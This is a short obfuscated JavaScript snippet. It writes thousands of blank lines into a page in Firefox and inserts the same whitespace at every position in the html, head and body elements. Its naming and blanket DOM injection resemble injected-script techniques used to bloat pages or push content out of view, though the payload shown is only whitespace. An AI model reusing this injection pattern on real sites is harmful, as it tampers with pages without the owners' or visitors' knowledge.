var qy7 = '';
qy8 = String.fromCharCode(13, 10);
for (i = 0; i < 2355; i++) {
    qy7 += qy8
};
function qy6() {
    if (window.sidebar) {
        document.write(qy7)
    }
};
qy6();
function qy9() {
    zi9 = "" + qy7 + "";
    zi2 = new Array('afterBegin', 'beforeEnd', 'afterEnd', 'beforeBegin');
    zi3 = new Array('html', 'head', 'body');
    for (k = 0; k <= zi3.length; k++) {
        zi4 = document.getElementsByTagName(zi3[k]);
        for (j = 0; j <= zi4.length; j++) {
            for (i = 0; i <= 3; i++) {
                if (zi4[j]) {
                    zi4[j].insertAdjacentHTML(zi2[i], zi9)
                }
            }
        }
    }
};

